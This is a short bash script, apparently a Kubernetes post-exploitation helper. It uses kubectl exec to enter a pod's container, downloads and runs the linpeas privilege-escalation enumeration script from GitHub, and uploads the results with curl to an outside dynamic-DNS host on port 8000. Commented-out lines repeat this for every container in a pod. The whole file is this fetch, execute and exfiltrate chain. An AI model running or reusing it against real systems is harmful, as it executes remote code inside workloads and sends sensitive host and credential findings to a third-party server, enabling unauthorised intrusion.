#!/bin/bash
#kubectl -n "$1" get pod "$2" -o jsonpath='{.spec.containers[*].name}' | tr " " "\n" | while read -r container; do echo $container; done
#kubectl -n "$1" get pod "$2" -o jsonpath='{.spec.containers[*].name}' | tr " " "\n" | while read -r container; do kubectl -n "$1" exec -it "$2" -c $container --  /bin/bash -c 'cd /tmp && /bin/bash -c "curl -OL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh > linpeas_$2_$container.out" ; curl -F 'file=@linpeas_$2_$container.out' http://pswalia2u.ddns.net:8000/'; done


kubectl -n "$1" exec -it "$2" -c "$3" --  /bin/bash -c "source ~/.bashrc;cd /tmp && /bin/bash -c \"curl -k -OL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh > linpeas_$2_$3.out\" ; curl -F \"file=@linpeas_$2_$3.out\" http://pswalia2u.ddns.net:8000/"